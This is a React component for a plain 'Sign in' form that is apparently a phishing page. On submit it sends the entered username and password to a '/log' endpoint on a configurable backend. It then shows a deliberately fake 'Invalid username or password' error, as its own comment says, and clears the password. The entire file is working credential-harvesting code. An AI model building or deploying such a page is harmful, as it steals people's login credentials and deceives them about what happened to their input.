import React, { useState } from "react";

const BACKEND = import.meta.env?.VITE_BACKEND_URL || "http://localhost:5000";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await fetch(`${BACKEND}/log`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      });
      // show fake error message and clear password
      setMsg("Invalid username or password");
      setPassword("");
    } catch (err) {
      setMsg("Network error");
      console.error(err);
    }
  };

  return (
    <div style={{ maxWidth: 360, margin: "6rem auto", padding: 20, border: "1px solid #ddd", borderRadius: 6 }}>
      <h2>Sign in</h2>
      <form onSubmit={handleSubmit}>
        <div style={{ marginBottom: 8 }}>
          <input value={username} onChange={e => setUsername(e.target.value)} placeholder="Username" required style={{ width: "100%", padding: 8 }} />
        </div>
        <div style={{ marginBottom: 8 }}>
          <input value={password} onChange={e => setPassword(e.target.value)} type="password" placeholder="Password" required style={{ width: "100%", padding: 8 }} />
        </div>
        <button type="submit" style={{ width: "100%", padding: 10 }}>Sign in</button>
      </form>
      {msg && <p style={{ color: "firebrick", marginTop: 12 }}>{msg}</p>}
    </div>
  );
}
